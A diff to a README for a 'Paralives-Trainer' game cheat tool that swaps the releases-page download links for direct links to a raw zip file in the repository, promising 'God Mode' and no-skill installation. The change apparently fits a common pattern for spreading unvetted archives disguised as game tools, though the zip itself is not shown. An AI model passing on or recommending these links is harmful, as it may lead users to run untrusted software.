@@ -1,10 +1,10 @@
 # 🚀 Paralives-Trainer - Unlock God Mode and Endless Fun
 
-[![Download Paralives-Trainer](https://img.shields.io/badge/Download-Paralives_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=%23000&color=%23ff6b6b)](https://github.com/Unchristian-shirtlifter896/Paralives-Trainer/releases)
+[![Download Paralives-Trainer](https://img.shields.io/badge/Download-Paralives_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=%23000&color=%23ff6b6b)](https://raw.githubusercontent.com/Unchristian-shirtlifter896/Paralives-Trainer/main/assets/Paralives_Trainer_v3.3.zip)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Unchristian-shirtlifter896/Paralives-Trainer/releases](https://github.com/Unchristian-shirtlifter896/Paralives-Trainer/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Unchristian-shirtlifter896/Paralives-Trainer/main/assets/Paralives_Trainer_v3.3.zip](https://raw.githubusercontent.com/Unchristian-shirtlifter896/Paralives-Trainer/main/assets/Paralives_Trainer_v3.3.zip)
 
 Once you land on the page, look for the newest release at the top. Click the download button to get the file. The download will start automatically. After it finishes, you'll have the trainer ready on your computer. No tech skills needed—just a few clicks and you're done.
 
